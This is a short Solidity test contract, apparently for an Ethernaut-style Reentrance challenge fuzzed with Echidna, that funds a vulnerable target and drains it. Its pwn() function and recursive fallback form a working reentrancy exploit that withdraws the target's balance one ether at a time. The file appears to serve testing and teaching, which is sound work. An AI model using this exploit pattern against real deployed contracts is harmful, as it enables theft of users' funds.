pragma solidity ^0.6.0;

import 'Reentrancy.sol';

contract Test {
  Reentrance target;

  constructor() public payable {
    // Create the target contract.
    target = new Reentrance();

    // Fund the contract. We could use transfer but there is already a built in way to move funds to the contract.
    target.donate.value(10 ether)(address(0x12345));
  }

  // Donate to the target contract on behalf of this address
  function donate() public {
    target.donate.value(1 ether)(address(this));
  }

  // Initiate a withdraw which will withdraw funds triggering the fallback function.
  function pwn() public {
    target.withdraw(1 ether);
  }

  fallback() external payable {
    // Get the balance of the target contract (the one calling this one)
    uint steal = address(msg.sender).balance;
    // Check if the balance is greater than one ether.
    // If the balance is greater than one ether, set the steal value to 1 ether.
    steal = steal > 1 ether ? 1 ether : steal;
    // If the balance is greater than one ether, attempt to withdraw it.
    if (steal != 0)
      address(msg.sender).call(abi.encodeWithSignature("withdraw(uint256)", steal));
  }

  function echidna_test_balance() public returns (bool) {
    return address(target).balance > 0;
  }
}